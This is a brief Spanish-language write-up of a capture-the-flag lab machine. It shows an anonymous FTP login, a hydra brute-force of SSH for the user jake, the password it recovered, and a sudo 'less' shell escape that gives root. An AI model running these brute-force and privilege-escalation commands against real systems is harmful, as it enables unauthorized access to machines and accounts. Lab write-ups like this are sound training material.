Muy muy sencilla esta máquina

PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

-Nos logueamos por ftp con el usuario Anonymous y nos descargamos un note.txt que dice que el usuario jake tiene una contraseña muy fácil:
	ftp IP
	Enter name: Anonymous
	get note.txt

-Usamos hydra para hacer una ataque de fuerza fuerza contra el servicio ssh y tratar de sacar la contraseña del usuario jake:
	hydra 10.10.100.243 ssh -l jake -P /usr/share/wordlists/rockyou.txt -vV
	Password: 987654321

-Nos autenticamos en shh con el usuario jake:
	ssh jake@10.10.100.243
	password: 987654321


## Escalada de privilegios

-Vemos que comandos puede realizar como sudo el usuario jake:
	sudo -l
	(ALL) NOPASSWD: /usr/bin/less

-Vamos a gtfobins y aprovechamos el binario para escalar los privilegios a root:
	sudo less /etc/profile
	!/bin/sh
